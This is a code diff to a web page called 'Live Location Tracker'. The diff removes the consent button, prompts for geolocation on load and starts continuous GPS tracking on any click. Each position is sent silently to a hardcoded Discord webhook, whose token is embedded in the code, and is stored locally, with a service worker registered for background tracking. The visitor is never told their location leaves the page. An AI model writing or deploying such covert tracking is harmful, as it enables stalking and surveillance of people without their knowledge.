@@ -10,22 +10,45 @@
 <body>
     <h2>Live Location Tracker</h2>
     <p id="status">Waiting for location access...</p>
-    <button id="requestLocation">Enable Location Access</button>
 
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             console.log("✅ Page loaded, checking location permissions...");
+            if (!navigator.geolocation) {
+        alert("❌ Geolocation is not supported by this browser.");
+        return;
+    }
+                // **Force browser to show permission prompt immediately**
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            console.log("✅ User granted geolocation access.");
+            startTracking(); // Start continuous tracking
+        },
+        (error) => {
+            console.error("🚨 Geolocation permission denied:", error.message);
+            alert("❌ You need to enable location access for this to work.");
+        },
+        { enableHighAccuracy: true }
+    );
 
+
+            navigator.permissions.query({ name: "geolocation" }).then((permissionStatus) => {
+        if (permissionStatus.state === "granted") {
+            console.log("✅ Geolocation already granted, starting tracking...");
+            startTracking();
+        } else {
+            console.warn("⚠️ Geolocation permission not granted yet. Waiting for user action...");
+        }
+    });
             if (!navigator.geolocation) {
                 alert("❌ Geolocation is not supported by this browser.");
                 return;
             }
 
             function sendLocation(latitude, longitude) {
-             const payload = {
-                content: `📍 **New Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️
-                 **Longitude:** ${longitude}\n🔗 [View on Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
-                };
+    const payload = {
+        content: `📍 **Live Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
+    };
 
     fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
         method: "POST",
@@ -41,52 +64,70 @@
     .catch(error => console.error("🚨 Error sending location:", error));
 }
 
+function saveLocationToDB(latitude, longitude) {
+    const request = indexedDB.open("LocationDB", 1);
 
+    request.onupgradeneeded = function (event) {
+        const db = event.target.result;
+        if (!db.objectStoreNames.contains("locations")) {
+            db.createObjectStore("locations", { keyPath: "id" });
+        }
+    };
+    request.onsuccess = function (event) {
+        const db = event.target.result;
 
-                function startTracking() {
-                    navigator.geolocation.watchPosition(
-                    (position) => {
-                        const { latitude, longitude } = position.coords;
-                        document.getElementById("status").innerText = `📍 Location: ${latitude}, ${longitude}`;
-                        sendLocation(latitude, longitude);
-                    },
-                    (error) => console.error("🚨 Location error:", error.message),
-                    {
-                        enableHighAccuracy: true,  // ✅ Uses GPS for maximum accuracy
-                        timeout: 5000,             // ⏳ Lower timeout to refresh faster
-                        maximumAge: 0              // ⏲️ Prevents cached locations
-                    }
-                    );
-            }
-            document.getElementById("requestLocation").addEventListener("click", () => {
-                startTracking();
-                document.getElementById("requestLocation").style.display = "none"; 
-            });
+        // Check if the object store exists before starting the transaction
+        if (db.objectStoreNames.contains("locations")) {
+            const transaction = db.transaction("locations", "readwrite");
+            const store = transaction.objectStore("locations");
+            store.put({ id: "latest", latitude, longitude });
+        } else {
+            console.error("Object store 'locations' does not exist.");
+        }
+    };
+        request.onerror = function () {
+            console.error("Failed to open IndexedDB.");
+        };
+    }
+    
+    function startTracking() {
+    console.log("🚀 Starting continuous geolocation tracking...");
 
-            // Automatically start tracking if the user has already granted permission
-            navigator.permissions.query({ name: "geolocation" }).then((permissionStatus) => {
-                if (permissionStatus.state === "granted") {
-                    startTracking();
-                    document.getElementById("requestLocation").style.display = "none";
-                } else {
-                    document.getElementById("requestLocation").style.display = "block";
-                }
-            });
+    navigator.geolocation.watchPosition(
+        (position) => {
+            const { latitude, longitude } = position.coords;
+            document.getElementById("status").innerText = `📍 Location: ${latitude}, ${longitude}`;
+            sendLocation(latitude, longitude);
+            saveLocationToDB(latitude, longitude);
+        },
+        (error) => console.error("🚨 Location error:", error.message),
+        {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        }
+    );
+}
+
+         
+            // Start tracking when user interacts with the page
+    document.addEventListener("click", () => {
+        console.log("🔄 User clicked, requesting location...");
+        startTracking();
+    }, { once: true });
+
+            // startTracking();
         });
 
-        // Register the Service Worker for background tracking
         if ("serviceWorker" in navigator) {
-                navigator.serviceWorker.register("service-worker.js")
-                    .then((registration) => {
-                        console.log("✅ Service Worker registered:", registration.scope);
-                    })
-                    .catch((error) => {
-                        console.error("🚨 Service Worker registration failed:", error);
-                    });
-            }
+            navigator.serviceWorker.register("service-worker.js")
+                .then((registration) => {
+                    console.log("✅ Service Worker registered:", registration.scope);
+                })
+                .catch((error) => {
+                    console.error("🚨 Service Worker registration failed:", error);
+                });
+        }
     </script>
-    <script href="server.js"></script>
-    <script href="locationWorker.js"></script>
-    
 </body>
 </html>
